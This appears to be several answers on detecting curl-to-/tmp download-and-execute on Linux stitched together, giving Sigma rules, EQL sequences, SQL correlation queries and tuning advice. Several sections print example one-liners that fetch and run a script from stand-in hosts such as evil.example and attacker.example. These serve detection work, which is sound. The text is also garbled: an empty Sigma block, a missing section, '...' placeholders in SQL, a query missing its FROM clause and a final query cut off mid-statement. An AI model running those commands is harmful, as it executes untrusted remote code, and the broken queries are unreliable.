Some malware performs the download and execution in one `bash` command:

```bash
bash -c "curl http://evil.example/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh"
```

You can add a separate Sigma rule for this variant:

```yaml
title: Bash Executes Download-and-Execute Command Writing Shell Script to /tmp
description: Detects bash command lines that combine curl download to /tmp and execution of /tmp script.
status: experimental
logsource:
  product: linux
  category: process_creation

detection:
  selection:
    Image|endswith:
      - '/bash'
    CommandLine|re: "(?i)curl.*(?:-o|--output).*?/tmp/.*?\\.(?:sh|bash).*?(?:bash|/tmp/.*?\\.(?:sh|bash))"

  condition: selection

falsepositives:
  - Legitimate maintenance scripts
  - CI/CD bootstrap scripts

level: medium
```

## Tuning Guidance

### High-confidence tuning

To reduce noise, add exclusions for known-good software. Examples:

```yaml
filter_known_administrators:
  User:
    - root
  ParentCommandLine|contains:
    - "/usr/sbin/apt"
    - "docker run"
    - "ansible"
    - "salt-call"
    - "puppet"
    - "chef-client"
```

Use caution before allowing `root`; many malware families execute as root.

### Broadening the rule

If the malicious script may not use the `.sh` extension, you can broaden the execution portion:

```text
process.executable or process.args or process.command_line contains /tmp/
```

However, this increases false positives from legitimate temp scripts.

### Better exact-file correlation

The rule above correlates generally:

```text
curl downloads /tmp/*.sh
bash executes /tmp/*.sh
```

For higher fidelity, extract the actual filename from both events and require the same file name:

```text
event1 file: /tmp/payload.sh
event2 file: /tmp/payload.sh
```

This reduces false positives where one process downloads a benign script in `/tmp` and another process later executes a different `/tmp` script.

text:
Below is a **process-sequence detection rule** for Linux endpoint telemetry. It detects the classic `curl` download-to-`/tmp` followed by shell/bash execution pattern.

## Detection rule: Curl Downloads Bash Script to `/tmp`, Followed by Bash Execution

```text
sequence by host.name with maxspan=3m
[process where host.name != null
  and host.os.type == "linux"
  and event.type != "change"
  and event.action in ("exec", "start")
  and process.name : "curl"
  and (
    (
      process.args : ("-o", "--output")
      and process.args : "/tmp/*.sh*"
    )
    or process.args : "--output=/tmp/*.sh*"
    or (
      process.command_line != null
      and process.command_line : (
        "*-o /tmp/*.sh*",
        "*--output /tmp/*.sh*",
        "*--output=/tmp/*.sh*",
        "*-o/tmp/*.sh*"
      )
    )
  )
  and not process.command_line : "*--help*"
]
[process where host.name != null
  and host.os.type == "linux"
  and event.action in ("exec", "start")
  and event.type != "change"
  and process.name : ("bash", "sh", "dash", "zsh")
  and (
    process.args : "/tmp/*.sh*"
    or (
      process.command_line != null
      and process.command_line : (
        "* /tmp/*.sh*",
        "*bash /tmp/*.sh*",
        "*sh /tmp/*.sh*"
      )
    )
  )
  and not process.command_line : "*--help*"
  and not process.command_line : "*--version*"
]
```

---

## What this rule detects

It requires two correlated events on the same host:

1. **Curl downloads or writes a `.sh` file into `/tmp`.**
   - Example:

     ```bash
     curl https://example[.]com/payload.sh -o /tmp/payload.sh
     curl --output /tmp/payload.sh https://example[.]com/payload.sh
     ```

2. **A shell, usually `bash`, executes a `.sh` file located in `/tmp`.**
   - Example:

     ```bash
     bash /tmp/payload.sh
     sh /tmp/payload.sh
     ```

This behavior is commonly associated with malware or attacker tools that download an installer or payload script and immediately execute it from a writable temporary directory.

---

## Notes / tuning

- If your environment uses `wget`, you can broaden the first step from:

  ```text
  process.name : "curl"
  ```

  to:

  ```text
  process.name : ("curl", "wget")
  ```

- If your EDR logs file-creation events, a higher-confidence variant is to correlate:
  1. `file.path` written by `curl` under `/tmp/*.sh`
  2. `bash`/`sh` executing that path

  Example idea:

  ```text
  sequence by host.name with maxspan=3m
  [file where host.name != null
    and host.os.type == "linux"
    and event.type != "change"
    and process.name : "curl"
    and file.path : "/tmp/*.sh*"
    and (
      process.args : ("-o", "--output")
      or process.command_line : ("*-o /tmp/*.sh*", "*--output /tmp/*.sh*")
    )
  ]
  [process where host.name != null
    and host.os.type == "linux"
    and event.action in ("exec", "start")
    and process.name : ("bash", "sh", "dash", "zsh")
    and (
      process.args : "/tmp/*.sh*"
      or process.command_line : "*"/tmp/*.sh*"
    )
  ]
  ```

- This rule is process-command-line based. If `curl` writes the file using shell redirection, such as:

  ```bash
  curl https://example[.]com/payload.sh > /tmp/payload.sh
  ```

  the first event may not contain `-o` or `--output`. In that case, use file-event correlation or a broader rule that detects `/tmp/*.sh` creation followed by shell execution.

- To reduce false positives, you can exclude known benign installers or admin workflows by adding filters on:
  - command-line arguments
  - parent process name
  - user account
  - source URL/IP, if available
  - file path, if the EDR supports file-event correlation

- Expected false positives include:
  - legitimate software installers downloading scripts to `/tmp`
  - developer tooling or build scripts
  - admin maintenance scripts using temporary directories

This rule provides a direct detection for the **download-and-execute** pattern using `curl` and `bash`/shell execution under `/tmp`.

Below is a practical detection rule set for the “curl downloads a shell script to `/tmp`, then `bash`/`sh` executes it” pattern.

This assumes **Sysmon for Linux** or equivalent process/file telemetry:

- `EventID 1`: Process Create
- `EventID 11`: File Create / File Write
- `curl` execution path: `/usr/bin/curl`, `/bin/curl`, `/usr/local/bin/curl`, etc.
- Shell execution: `/usr/bin/bash`, `/bin/bash`, `/usr/bin/sh`, `/bin/sh`, optionally `/usr/bin/dash`, `/usr/bin/zsh`

There are two useful implementations:

1. **Single-event parent/child Sigma rule** — low-noise, immediately deployable.
2. **Two-step correlated sequence rule** — better coverage for “download followed by execution.”

---

## 1. Sigma Rule: Direct / Wrapper Parent-Child Detection

This rule detects `bash` or `sh` executing a script under `/tmp` when the parent process is `curl`, or when the parent is a shell whose command line contains evidence of a `curl` download of a `/tmp` script.

```yaml
title: Malicious Download and Execution - curl Downloads Bash Script to /tmp Then Executes via bash
description: |
  Detects a classic Linux malware delivery pattern where curl downloads or
  redirects a shell script into /tmp and bash or sh subsequently executes it.
  This rule uses Sysmon process creation events and checks parent process or
  parent command-line evidence.

status: experimental
author: Detection Engineer
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1105
  - attack.t1059.004

logsource:
  product: linux
  service: sysmon

detection:
  # Process creation event.
  selection_base:
    EventID: 1

  # Bash/sh execution of a script located under /tmp.
  selection_exec_tmp_script:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  # Parent is curl directly executing bash.
  selection_parent_curl:
    ParentImage|endswith:
      - '/curl'
      - '/curl.exe'

  # Parent is a shell wrapper whose command line shows curl downloading a /tmp script.
  selection_parent_shell_curl_output:
    ParentImage|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    ParentCommandLine|contains|all:
      - 'curl'
      - '-o'
      - '/tmp/'
      - '.sh'

  # Shell wrapper using redirection: curl ... > /tmp/script.sh
  selection_parent_shell_curl_redirect_space:
    ParentImage|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    ParentCommandLine|contains|all:
      - 'curl'
      - '> /tmp/'
      - '.sh'

  # Shell wrapper using redirection without space: curl ... >/tmp/script.sh
  selection_parent_shell_curl_redirect_nospace:
    ParentImage|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    ParentCommandLine|contains|all:
      - 'curl'
      - '>/tmp/'
      - '.sh'

  condition: >
    selection_base
    and selection_exec_tmp_script
    and
    (
      selection_parent_curl
      or selection_parent_shell_curl_output
      or selection_parent_shell_curl_redirect_space
      or selection_parent_shell_curl_redirect_nospace
    )

falsepositives:
  - Legitimate software installers
  - Patching scripts
  - CI/CD runners
  - Deployment automation
  - Admin scripts that use curl and run shell scripts from /tmp

level: high
```

### What this detects

Examples likely to trigger this rule:

```bash
curl http://malicious.example/x.sh -o /tmp/x.sh && bash /tmp/x.sh
```

```bash
curl -o /tmp/x.sh http://malicious.example/x.sh && /tmp/x.sh
```

```bash
bash -c "curl -o /tmp/x.sh https://evil.example/x.sh && bash /tmp/x.sh"
```

```bash
bash -c "curl https://evil.example/x.sh > /tmp/x.sh && /tmp/x.sh"
```

### Limitation

This is a parent/child style rule. It is good for many cases, but it may miss cases where the download and execution are separated by intermediate processes, cron, systemd, or a script that does not expose the `curl` command line in the immediate parent process. For full coverage, use the sequence/correlation approach below.

---

## 2. Sigma Rules for Correlated Download + Execution

For environments that support Sigma correlation or SIEM sequence detection, deploy the two rules below and correlate them on the same host within a short timeframe, such as 5–15 minutes.

---

### Rule A: curl Creates or Downloads Shell Script under `/tmp`

```yaml
title: curl Downloads or Creates Shell Script under /tmp
description: |
  Detects curl downloading or writing a shell script into /tmp. This is a
  companion rule for the download-and-execute pattern.

status: experimental
author: Detection Engineer
references:
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.execution
  - attack.t1105

logsource:
  product: linux
  service: sysmon

detection:
  # curl process command line contains -o /tmp/... and .sh
  selection_curl_process_output:
    EventID: 1
    Image|endswith:
      - '/curl'
      - '/curl.exe'
    CommandLine|contains|all:
      - '-o'
      - '/tmp/'
      - '.sh'

  # curl file write to /tmp with .sh extension
  selection_curl_file_write_sh:
    EventID: 11
    Image|endswith:
      - '/curl'
      - '/curl.exe'
    TargetFilename|startswith: '/tmp/'
    TargetFilename|endswith: '.sh'

  # Shell redirection by bash/sh: curl ... > /tmp/script.sh
  selection_shell_redirect_file_write_sh:
    EventID: 11
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    TargetFilename|startswith: '/tmp/'
    TargetFilename|endswith: '.sh'
    CommandLine|contains|all:
      - 'curl'
      - '> /tmp/'

  condition: 1 of selection_*

falsepositives:
  - Legitimate software installation
  - Patching scripts
  - CI/CD deployment
  - Admin tooling

level: medium
```

---

### Rule B: bash or sh Executes Script from `/tmp`

```yaml
title: Bash or sh Executes Shell Script from /tmp
description: |
  Detects execution of shell scripts located under /tmp. Use this as the second
  part of a correlated detection where it follows a curl download to /tmp.

status: experimental
author: Detection Engineer
references:
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1059.004

logsource:
  product: linux
  service: sysmon

detection:
  selection_execution:
    EventID: 1
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  condition: selection_execution

falsepositives:
  - Legitimate scripts executed from /tmp
  - Temporary deployment scripts
  - Test harnesses
  - CI/CD runners

level: medium
```

---

### Correlation Logic

Conceptual correlation:

```text
alert if:
  host.name = <same host>
  AND rule_A.curl_download_script_to_tmp occurred
  AND rule_B.bash_executes_tmp_script occurred
  AND rule_B timestamp is 1 to 15 minutes after rule_A timestamp
```

In Sigma-style pseudocode, if your SIEM supports Sigma correlation:

```yaml
correlation:
  type: event_sequence
  rules:
    - rule_A_curl_download_script_to_tmp
    - rule_B_bash_executes_tmp_script
  group_by:
    - host.name
  timeframe: 15m
  condition: rule_A followed by rule_B
```

Not all Sigma engines implement correlation identically. In many SIEM platforms, you may need to implement this as a native sequence, transaction, or correlation rule.

---

## 3. Elastic EQL Sequence Example

If your environment is Elastic, an EQL sequence may be the most direct implementation of “download followed by execution.”

```kql
sequence by host.id with maxspan=15m
  [process where event.action in ("exec", "execve")
    and event.type in ("start", "start")
    and process.name in ("curl", "curl.exe")
    and (
      process.args : *"-o"
      or process.args : *"--output"
      or process.args : *">"
    )
    and process.args : *"/tmp/*"
    and process.args : *.sh*
  ]
  [process where event.action in ("exec", "execve")
    and event.type in ("start", "start")
    and process.name in ("bash", "sh", "dash", "zsh")
    and process.args : *"/tmp/*"
    and process.args : *.sh*
    and (
      process.parent.name in ("curl", "curl.exe", "bash", "sh", "dash", "zsh")
      or process.parent.args : *curl*
    )
  ]
```

This sequence looks for:

1. A `curl` process involving `/tmp/` and `.sh`
2. Followed by a `bash`, `sh`, `dash`, or `zsh` process involving `/tmp/` and `.sh`
3. On the same host within 15 minutes

You can reduce false positives by restricting the second step to a `curl` parent:

```kql
process.parent.name in ("curl", "curl.exe")
```

But that may miss shell-wrapper execution.

---

## 4. More Precise Single Rule Using Regex

If your Sigma parser supports regular expressions, this single-event rule is more precise than simple `contains` filters.

```yaml
title: curl Downloads Bash Script to /tmp Then bash Executes
description: |
  Detects bash/sh execution of a shell script under /tmp where either curl is
  the parent process or the parent command line shows curl downloading a script
  to /tmp.

status: experimental
author: Detection Engineer
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.execution
  - attack.t1105
  - attack.t1059.004

logsource:
  product: linux
  service: sysmon

detection:
  selection_base:
    EventID: 1

  selection_exec_bash_tmp_script:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    CommandLine|re: '(?i)/tmp/[^\s;|&"]+\.sh\b'

  selection_parent_curl:
    ParentImage|endswith:
      - '/curl'
      - '/curl.exe'

  selection_parent_shell_curl_download:
    ParentImage|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    ParentCommandLine|re: >
      (?xi)
      curl\b.*
      (?:
        \s(?:-o|--output)\s*"?/tmp/[^\s;|&"]+\.sh\b
        |
        \s>\s*"?/tmp/[^\s;|&"]+\.sh\b
      )

  condition: >
    selection_base
    and selection_exec_bash_tmp_script
    and
    (
      selection_parent_curl
      or selection_parent_shell_curl_download
    )

falsepositives:
  - Legitimate installer scripts
  - CI/CD automation
  - Patching and deployment tasks

level: high
```

This regex-based rule is less likely to trigger on generic `/tmp` and `.sh` references, but it may miss variants with spaces in filenames, Unicode paths, or heavily obfuscated command lines.

---

## 5. Recommended Production Approach

For the best balance of detection and reliability:

1. **Deploy the parent/child Sigma rule first**  
   Use the first rule to get immediate coverage with relatively low noise.

2. **Add the sequence/correlation rules for broader coverage**  
   Use the download rule and execution rule together in SIEM correlation.

3. **Tune for legitimate admin activity**  
   Consider suppressing or filtering:

   ```text
   /usr/sbin/
   /usr/bin/apt
   /usr/bin/dnf
   /usr/bin/yum
   /usr/bin/snap
   /usr/bin/flatpak
   /usr/bin/puppet
   /usr/bin/chef-client
   /usr/bin/ansible
   /opt/
   /usr/libexec/
   ```

4. **Expand path monitoring if needed**  
   Malware may also use:

   ```text
   /var/tmp/
   /dev/shm/
   /home/
   /root/
   ```

   If you want broader coverage, include those directories, but expect more false positives.

text:
Below is a detection rule for the classic Linux malware pattern:

> `curl` downloads a Bash script into `/tmp`, and shortly afterward the script is executed by `bash`, `sh`, `dash`, `zsh`, or `ksh`.

Because the behavior spans **two separate process-creation events**, the most reliable implementation is a **process-sequence / correlation rule**, not a single Sigma event-only rule. Sigma atomic rules can detect the two stages individually, and your SIEM/EDR correlates them.

---

## 1. Detection Rule Logic: `curl -> /tmp/*.sh -> bash /tmp/*.sh`

```yaml
title: Malicious Download-and-Execute via curl to /tmp followed by Bash Execution
description: >
  Detects curl downloading or writing a Bash script to /tmp, followed within a
  short time window by execution of a Bash script from /tmp by bash/sh/dash/zsh.
status: experimental
type: process_sequence
references:
  - MITRE ATT&CK T1059.004 - Command and Scripting Interpreter: Unix Shell
  - MITRE ATT&CK T1105 - Ingress Tool Transfer
tags:
  - attack.execution
  - attack.command_scripting
  - attack.t1059.004
  - attack.t1105
logsource:
  product: linux
  category: process_creation
  description: >
    Requires Linux process-start/process-creation telemetry from EDR, Sysmon for Linux,
    auditd, CrowdStrike, Elastic Agent, Splunk, Defender, etc.

detection:
  first_event:
    name: curl_download_script_to_tmp
    condition:
      process.image_basename: curl
      command_line_regex:
        - '(?:-o|--output)[= ]+(?:[^\\s]+/)?/tmp/[^\\s]+\\.sh'
        - '(?:>|>>)\\s+/tmp/[^\\s]+\\.sh'
        - 'tee[^\\s]*\\s+/tmp/[^\\s]+\\.sh'
      network_or_url_indicator:
        command_line_regex:
          - 'https?://'
          - 'ftp://|ftps://|sftp://'
          - '--url\\b'
      extracted_script_path:
        starts_with: /tmp/
        ends_with: .sh
      exclusions:
        parent_image_basename:
          - apt
          - apt-get
          - dpkg
          - rpm
          - dnf
          - yum
          - zypper
          - pacman
          - snap
          - flatpak
          - brew
          - pip
          - npm

  then_event:
    name: bash_execute_script_from_tmp
    condition:
      process.image_basename:
        - bash
        - sh
        - dash
        - zsh
        - ksh
      command_line_regex:
        - '(?:bash|sh|dash|zsh|ksh)(?:\\s+[-+a-zA-Z0-9_]+)*\\s+/tmp/[^\\s]+\\.sh'
        - '(?:source|\\.)\\s+/tmp/[^\\s]+\\.sh'
      command_line_contains_all:
        - '/tmp/'
        - '.sh'
      exclusions:
        command_line_regex:
          - '\\b(?:chmod|rm|mv|touch|mkdir|cat|grep|sed|awk)\\s+.*?/tmp/[^\\s]+\\.sh'
        parent_image_basename:
          - apt
          - apt-get
          - dpkg
          - rpm
          - dnf
          - yum
          - zypper
          - pacman
          - snap
          - flatpak
          - brew
          - pip
          - npm

  correlation:
    match_on:
      - host.name
      - process.session_id
      - extracted_script_path
    fallback_match_on:
      - host.name
      - process.user_id
      - process.parent.pid
    order: ascending_time
    time_window_seconds: 300
```

Core behavior:

```text
Event 1:
  curl process creates or downloads /tmp/<name>.sh

Event 2:
  bash/sh/dash/zsh/ksh process executes /tmp/<name>.sh

Correlate:
  Same host + same session/user/parent lineage + extracted script path
  Execution happens after download within 5 minutes.
```

## 2. Elastic EQL / EDR Sequence Rule

Use this as an **Elastic EQL sequence rule** or equivalent EDR behavioral sequence. Field names may vary by EDR/ECS mapping.

```text
// Elastic EQL sequence rule
// Requires Linux process-start telemetry.
// If process.session_id is unavailable, reduce correlation to host.name only,
// but host-only correlation will be noisier.

sequence by host.name, process.session_id with maxspan=5m
  [process where event.kind == "event" and event.type == "start"
    and host.os.type == "linux"

    // curl download event
    and (process.name == "curl" or process.exe == "*/usr/bin/curl"
         or process.exe == "*/usr/local/bin/curl" or process.exe == "*/bin/curl")

    // writes .sh file into /tmp using curl output redirect options
    and (
      process.command_line =~ "(-o|--output)[= ]+(?:[^ ]*/)?/tmp/[^ ]+\\.sh"
      or process.command_line =~ "(>|>>) /tmp/[^ ]+\\.sh"
      or process.command_line =~ "tee[^ ]* /tmp/[^ ]+\\.sh"
    )

    // indicates remote retrieval / installer behavior
    and (
      process.command_line =~ "https?://"
      or process.command_line =~ "ftp://|ftps://|sftp://"
      or process.command_line =~ "--url"
    )

    // optional noise reduction
    and not (
      process.parent.name == "apt"
      or process.parent.name == "apt-get"
      or process.parent.name == "dpkg"
      or process.parent.name == "rpm"
      or process.parent.name == "dnf"
      or process.parent.name == "yum"
      or process.parent.name == "zypper"
      or process.parent.name == "pacman"
      or process.parent.name == "snap"
      or process.parent.name == "flatpak"
      or process.parent.name == "brew"
      or process.parent.name == "pip"
      or process.parent.name == "npm"
    )
  ]
  [process where event.kind == "event" and event.type == "start"
    and host.os.type == "linux"

    // bash-family execution event
    and (
      process.name == "bash"
      or process.name == "sh"
      or process.name == "dash"
      or process.name == "zsh"
      or process.name == "ksh"
      or process.exe == "*/bin/bash"
      or process.exe == "*/usr/bin/bash"
      or process.exe == "*/bin/sh"
      or process.exe == "*/usr/bin/sh"
      or process.exe == "*/bin/dash"
      or process.exe == "*/usr/bin/dash"
      or process.exe == "*/bin/zsh"
      or process.exe == "*/usr/bin/zsh"
    )

    // executes a Bash script from /tmp
    and process.command_line =~ "/tmp/[^ ]+\\.sh"
    and (
      process.command_line =~ "(bash|sh|dash|zsh|ksh)( -[a-zA-Z0-9_-]+)* /tmp/[^ ]+\\.sh"
      or process.command_line =~ "(source|\\. ) /tmp/[^ ]+\\.sh"
    )

    // optional noise reduction
    and not (
      process.parent.name == "apt"
      or process.parent.name == "apt-get"
      or process.parent.name == "dpkg"
      or process.parent.name == "rpm"
      or process.parent.name == "dnf"
      or process.parent.name == "yum"
      or process.parent.name == "zypper"
      or process.parent.name == "pacman"
      or process.parent.name == "snap"
      or process.parent.name == "flatpak"
      or process.parent.name == "brew"
      or process.parent.name == "pip"
      or process.parent.name == "npm"
    )
  ]
```

## 3. Path-Aware Correlation Query

If your SIEM supports SQL-style extraction and correlation, this is higher fidelity than matching by time/session only because it verifies that the downloaded script path matches the executed script path.

```sql
-- Generic SQL-like detection query
-- Field names/functions will vary by SIEM: Snowflake, BigQuery, Redshift,
-- PostgreSQL, DuckDB, Splunk, Elasticsearch SQL, etc.

WITH download_events AS (
  SELECT
    event_timestamp AS download_time,
    host_name,
    process_session_id,
    process_user_id,
    command_line AS download_cmd,
    COALESCE(
      REGEXP_EXTRACT(
        command_line,
        '(?:-o|--output)[= ]+(?:[^ ]+/)?(/tmp/[^ ]+\\.sh)'
      ),
      REGEXP_EXTRACT(
        command_line,
        '(?:>|>>) +(/tmp/[^ ]+\\.sh)'
      ),
      REGEXP_EXTRACT(
        command_line,
        'tee[^ ]* +(/tmp/[^ ]+\\.sh)'
      )
    ) AS script_path
  FROM process_events
  WHERE event_type = 'process_start'
    AND lower(basename(process_path)) = 'curl'
    AND (
      command_line LIKE '%http://%'
      OR command_line LIKE '%https://%'
      OR command_line LIKE '%ftp://%'
      OR command_line LIKE '%ftps://%'
      OR command_line LIKE '%sftp://%'
      OR command_line LIKE '%--url %'
    )
    AND command_line REGEXP
      '(?:-o|--output)[= ]+(?:[^ ]+/)?/tmp/[^ ]+\\.sh'
      OR command_line REGEXP
      '(?:>|>>) +/tmp/[^ ]+\\.sh'
      OR command_line REGEXP
      'tee[^ ]* +/tmp/[^ ]+\\.sh'
    AND lower(basename(parent_process_path)) NOT IN (
      'apt','apt-get','dpkg','rpm','dnf','yum','zypper',
      'pacman','snap','flatpak','brew','pip','npm'
    )
),
execute_events AS (
  SELECT
    event_timestamp AS exec_time,
    host_name,
    process_session_id,
    process_user_id,
    command_line AS exec_cmd,
    REGEXP_EXTRACT(
      command_line,
      '(/tmp/[^ ]+\\.sh)'
    ) AS script_path
  FROM process_events
  WHERE event_type = 'process_start'
    AND lower(basename(process_path)) IN (
      'bash','sh','dash','zsh','ksh'
    )
    AND command_line LIKE '%/tmp/%.sh%'
    AND command_line REGEXP
      '(bash|sh|dash|zsh|ksh)( -[a-zA-Z0-9_-]+)* /tmp/[^ ]+\\.sh'
      OR command_line REGEXP
      '(source|\\. ) /tmp/[^ ]+\\.sh'
    AND lower(basename(parent_process_path)) NOT IN (
      'apt','apt-get','dpkg','rpm','dnf','yum','zypper',
      'pacman','snap','flatpak','brew','pip','npm'
    )
)
SELECT
  d.host_name,
  d.process_session_id,
  d.process_user_id,
  d.script_path,
  d.download_time,
  d.download_cmd,
  e.exec_time,
  e.exec_cmd,
  TIMESTAMP_DIFF(e.exec_time, d.download_time, SECOND) AS delay_seconds
FROM download_events d
JOIN execute_events e
  ON d.host_name = e.host_name
 AND (
      d.process_session_id IS NULL
      OR e.process_session_id IS NULL
      OR d.process_session_id = e.process_session_id
    )
 AND d.script_path IS NOT NULL
 AND e.script_path IS NOT NULL
 AND d.script_path = e.script_path
WHERE e.exec_time > d.download_time
  AND e.exec_time <= d.download_time + INTERVAL '5' MINUTE
ORDER BY e.exec_time DESC;
```

## 4. Sigma Implementation

Sigma alone cannot reliably express “event A followed by event B” unless your SIEM supports correlation rules or you perform downstream correlation. Use the two atomic Sigma rules below, then correlate them in your SIEM.

### Sigma Rule 1: `curl` Downloads Bash Script to `/tmp`

```yaml

## 5. SIEM Correlation Configuration

Correlate events from the two Sigma rules using this logic:

```text
If:
  - Rule 1 detected a curl download of /tmp/<name>.sh
  - Rule 2 detected bash/sh/dash/zsh/ksh execution of /tmp/<name>.sh
Then:
  Alert if execution occurred after download within 300 seconds.

Preferred correlation keys:
  1. host.name
  2. process.session_id or process.parent_pid or process_guid
  3. extracted script_path, if your EDR/SIEM supports regex extraction

If script_path is not available:
  Match on host.name + process.session_id + user_id, within 5 minutes.
```

Example pseudo-SIEM correlation:

```text
Rule 1 event A:
  process.name == "curl"
  command_line contains /tmp/ and .sh
  command_line contains http(s)://, ftp://, sftp://, ftps://, or --url

Rule 2 event B:
  process.name in [bash, sh, dash, zsh, ksh]
  command_line contains /tmp/ and .sh

Alert:
  A followed_by B
  where same host
    and same session or parent lineage
    and time(B) > time(A)
    and time(B) - time(A) <= 300 seconds
```

## 7. Tuning Guidance

### Expected malicious behavior examples

```bash
curl https://attacker.example/m.sh -o /tmp/m.sh && bash /tmp/m.sh
```

```bash
curl -o /tmp/install.sh https://attacker.example/install.sh; bash /tmp/install.sh
```

```bash
curl -L https://attacker.example/payload --output /tmp/payload.sh; sh /tmp/payload.sh
```

```bash
curl https://attacker.example/x > /tmp/x.sh; chmod +x /tmp/x.sh; /tmp/x.sh
```

If the last example executes directly rather than through `bash`, your file-execution detection may also catch `/tmp/x.sh` as an executed script.

### False positives to consider

These legitimate patterns may trigger the rule:

- Software vendors using temporary installer scripts.
- CI/CD runners downloading scripts to `/tmp` or `/var/tmp`.
- Ansible, Chef, Puppet, Salt, or deployment tools staging scripts.
- Admin scripts using `curl -o /tmp/... && bash /tmp/...`

### Recommended allow-listing

Before deploying, add allow-lists for known environments, for example:

```yaml
filter_known_good:
  User|contains:
    - deployuser
    - jenkins
    - gitlab-runner
  ProcessGuid|endswith:
    - <known-good-guid>
  Image|contains:
    - '/usr/bin/apt'
    - '/usr/bin/dpkg'
    - '/usr/bin/dnf'
    - '/usr/bin/yum'
```

For high-fidelity detection, prefer matching the exact downloaded script path to the executed script path rather than correlating only by host and time.

-- Download-and-Execute (curl -> /tmp/script.sh, then bash /tmp/script.sh)
WITH download_events AS (
  SELECT
    event_timestamp AS ts,
    host_name,
    process_session_id,
    process_parent_pid,
    process_user_id,
    command_line,
    lower(process_path) AS process_path,
    -- extract target /tmp script path
    COALESCE(
      regexp_extract(command_line, '(?:-o|--output)\\s+(/tmp/[^\\s]+\\.sh)', 1),
      regexp_extract(command_line, '>\\s*(/tmp/[^\\s]+\\.sh)', 1),
      regexp_extract(command_line, 'tee[^\\s]*\\s+(/tmp/[^\\s]+\\.sh)', 1)
    ) AS script_path
  FROM process_events
  WHERE event_type = 'process_start'
    AND lower(replace(process_path, '\\', '/')) LIKE '%/curl'
    AND (
      command_line LIKE '%http://%'
      OR command_line LIKE '%https://%'
      OR command_line LIKE '%ftp://%'
      OR command_line LIKE '%sftp://%'
      OR command_line LIKE '%ftps://%'
      OR command_line LIKE '%--url %'
    )
    AND (
      command_line LIKE '%-o /tmp/%.sh%'
      OR command_line LIKE '%--output /tmp/%.sh%'
      OR command_line LIKE '%-o=%/tmp/%.sh%'
      OR command_line LIKE '%--output=%/tmp/%.sh%'
      OR command_line LIKE '%> /tmp/%.sh%'
      OR command_line LIKE '%>> /tmp/%.sh%'
    )
    AND NOT (process_parent_path LIKE '%apt%' OR ...)
),
execute_events AS (
  SELECT
    event_timestamp AS ts,
    host_name,
    process_session_id,
    process_parent_pid,
    command_line,
    regexp_extract(command_line, '(/tmp/[^\\s]+\\.sh)', 1) AS script_path
  FROM process_events
  WHERE event_type='process_start'
    AND (
      lower(process_path) LIKE '%/bash' OR lower(process_path) LIKE '%/sh' OR ...
    )
    AND command_line LIKE '%/tmp/%.sh%'
    AND NOT (process_parent_path LIKE '%apt%'...)
)
SELECT d.ts AS download_time, d.host_name, d.script_path, d.command_line AS download_cmd,
       e.ts AS execution_time, e.command_line AS execution_cmd,
       e.ts - d.ts AS delay_seconds
FROM download_events d
JOIN execute_events e
  ON d.host_name = e.host_name
 AND (d.process_session_id IS NULL OR d.process_session_id = e.process_session_id OR d.process_parent_pid = e.process_parent_pid)
WHERE e.script_path = d.script_path
  AND e.ts > d.ts
  AND e.ts <= d.ts + INTERVAL '300' SECOND
ORDER BY e.ts DESC;

-- Generic SIEM/EDR detection query for curl -> /tmp/*.sh -> bash /tmp/*.sh
WITH download_events AS (
  SELECT
    ts AS download_time,
    host,
    session_id,
    user_id,
    cmdline AS download_cmd,
    -- Extract the output script path from common curl output forms.
    COALESCE(
      REGEXP_EXTRACT(cmdline, '(?:-o|--output)[= ]+(/tmp/[^ ]+\\.sh)', 1),
      REGEXP_EXTRACT(cmdline, '(?:>|>>) (/tmp/[^ ]+\\.sh)', 1),
      REGEXP_EXTRACT(cmdline, 'tee[^ ]* (/tmp/[^ ]+\\.sh)', 1)
    ) AS script_path
  FROM process_events
  WHERE event_name = 'Process Start'
    AND lower(basename(image)) = 'curl'
    AND (
      cmdline LIKE '%http://%'
      OR cmdline LIKE '%https://%'
      OR cmdline LIKE '%ftp://%'
      OR cmdline LIKE '%ftps://%'
      OR cmdline LIKE '%sftp://%'
      OR cmdline LIKE '%--url %'
    )
    AND cmdline REGEXP '(?:-o|--output)[= ]+(?:[^ ]+/)?/tmp/[^ ]+\\.sh|(?:>|>>) /tmp/[^ ]+\\.sh|tee[^ ]* /tmp/[^ ]+\\.sh'
    AND NOT (
      lower(basename(parent_image)) IN ('apt','apt-get','dpkg','rpm','dnf','yum','zypper','pacman','snap','flatpak','brew','pip','npm')
    )
),
execute_events AS (
  SELECT
    ts AS exec_time,
    host,
    session_id,
    user_id,
    cmdline AS exec_cmd,
    REGEXP_EXTRACT(cmdline, '(/tmp/[^ ]+\\.sh)', 1) AS script_path

  WHERE event_name = 'Process Start'

    AND cmdline LIKE '%/tmp/%.sh%'
    AND cmdline REGEXP '(bash|sh|dash|zsh|ksh)( -[a-zA-Z0-9_\\-]+)* /tmp/[^ ]+\\.sh|(source|\\.) /tmp/[^ ]+\\.sh'
    AND NOT (
      lower(basename(parent_image)) IN ('apt','apt-get','dpkg','rpm','dnf','yum','zypper','pacman','snap','flatpak','brew','pip','npm')
    )
)
SELECT
  d.host,
  d.session_id,
  d.user_id,
  d.script_path,
  d.download_time,
  d.download_cmd,
  e.exec_time,
  e.exec_cmd,
  TIMESTAMP_DIFF(e.exec_time, d.download_time, SECOND) AS delay_seconds
FROM download_events d
JOIN execute_events e
  ON d.host = e.host

text:
